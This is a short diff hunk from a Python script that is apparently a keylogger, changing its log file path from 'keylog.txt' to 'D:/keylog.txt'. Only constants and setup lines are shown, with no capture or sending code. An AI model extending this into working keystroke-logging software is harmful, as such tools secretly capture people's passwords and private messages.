@@ -6,7 +6,7 @@ import os
 from datetime import datetime
 
 # Constants
-LOG_FILE_PATH = "keylog.txt"
+LOG_FILE_PATH = "D:/keylog.txt"
 LOG_INTERVAL = 600  
 
 if not os.path.exists(LOG_FILE_PATH):
